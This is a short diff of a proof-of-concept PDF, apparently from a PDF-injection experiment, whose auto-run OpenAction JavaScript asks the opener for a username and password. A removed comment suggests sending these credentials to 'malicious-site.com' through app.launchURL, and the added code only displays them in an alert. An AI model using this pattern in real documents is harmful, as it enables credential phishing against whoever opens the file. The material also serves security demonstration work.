@@ -1,3 +1,4 @@
+mona@DESKTOP-O7DRRM8:~/pdf-injection$ cat xssPDF-2.pdf
 %PDF-1.7
 1 0 obj
 <</Pages 2 0 R /OpenAction 3 0 R>>
@@ -19,9 +20,7 @@ if (w == 4) { // If the user clicks "OK"
 }
 
 if (username && password) {
-    app.alert('Logging in...');
-    // This is where you could include a call to an external URL
-    // using a function like app.launchURL('http://malicious-site.com?user=' + username + '&pass=' + password);
+    app.alert('Username: ' + username + '\\nPassword: ' + password);
 } else {
     app.alert('Login canceled.');
 }
@@ -38,3 +37,4 @@ endstream
 endobj
 trailer
 <</Root 1 0 R>>
+%%EOF
